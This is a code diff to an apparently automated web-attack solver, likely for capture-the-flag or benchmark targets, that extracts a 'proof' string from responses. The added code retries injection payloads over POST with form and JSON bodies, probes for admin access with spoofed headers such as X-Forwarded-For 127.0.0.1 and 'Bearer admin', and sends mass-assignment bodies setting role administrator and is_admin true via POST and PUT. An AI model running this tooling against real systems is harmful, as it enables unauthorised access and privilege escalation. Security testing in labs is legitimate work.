@@ -54,9 +54,16 @@ def _request(
         return exc.code, body, res_headers
 
 
-def _extract_proof(text: str) -> str | None:
-    match = PROOF_PATTERN.search(text)
-    return match.group(0) if match else None
+def _extract_proof(text: str, headers: dict[str, str] | None = None) -> str | None:
+    match = PROOF_PATTERN.search(text or "")
+    if match:
+        return match.group(0)
+    if headers:
+        for k, v in headers.items():
+            m = PROOF_PATTERN.search(f"{k}: {v}")
+            if m:
+                return m.group(0)
+    return None
 
 
 # ---------------------------------------------------------------------------
@@ -1231,12 +1238,48 @@ def solve_autonomous_web(target_url: str) -> str:
             for pl in payloads:
                 try:
                     enc = urllib.parse.quote(pl)
-                    st, b, _ = _request(f"{base}{feat_route}?{p}={enc}")
-                    proof = _extract_proof(b)
+                    st, b, h = _request(f"{base}{feat_route}?{p}={enc}")
+                    proof = _extract_proof(b, h)
                     if proof:
                         return proof
+                    # If GET is forbidden or rejected with Method Not Allowed, fallback to POST
+                    if st in (405, 400) or "method not allowed" in b.lower():
+                        st2, b2, h2 = _request(f"{base}{feat_route}", method="POST",
+                                               data=urllib.parse.urlencode({p: pl}).encode("utf-8"),
+                                               headers={"Content-Type": "application/x-www-form-urlencoded"})
+                        proof = _extract_proof(b2, h2)
+                        if proof:
+                            return proof
+                        st3, b3, h3 = _request(f"{base}{feat_route}", method="POST",
+                                               data=json.dumps({p: pl}).encode("utf-8"),
+                                               headers={"Content-Type": "application/json"})
+                        proof = _extract_proof(b3, h3)
+                        if proof:
+                            return proof
                 except Exception:
                     pass
+
+    # Header-based loopback / admin role bypass probe
+    if feat_route:
+        admin_hdrs = [
+            {"X-Forwarded-For": "127.0.0.1"},
+            {"X-Real-IP": "127.0.0.1"},
+            {"X-Role": "administrator"},
+            {"Authorization": "Bearer admin"},
+        ]
+        for hdr in admin_hdrs:
+            try:
+                st, b, h = _request(f"{base}{feat_route}", headers=hdr)
+                proof = _extract_proof(b, h)
+                if proof:
+                    return proof
+                if sec_route:
+                    st2, b2, h2 = _request(f"{base}{sec_route}", headers=hdr)
+                    proof = _extract_proof(b2, h2)
+                    if proof:
+                        return proof
+            except Exception:
+                pass
 
     if feat_route and sec_route:
         # Try SSRF to secondary_route
@@ -1256,8 +1299,9 @@ def solve_autonomous_web(target_url: str) -> str:
                 "display_name": "Test", "role": "administrator", "is_admin": True,
                 "admin": True, "isAdmin": True, "roles": ["administrator"], "permission": "all"
             }
-            _request(f"{base}{feat_route}", method="POST", data=json.dumps(combined).encode("utf-8"),
-                     headers={"Content-Type": "application/json"})
+            for m in ["POST", "PUT"]:
+                _request(f"{base}{feat_route}", method=m, data=json.dumps(combined).encode("utf-8"),
+                         headers={"Content-Type": "application/json"})
             st, b, _ = _request(f"{base}{sec_route}")
             proof = _extract_proof(b)
             if proof:
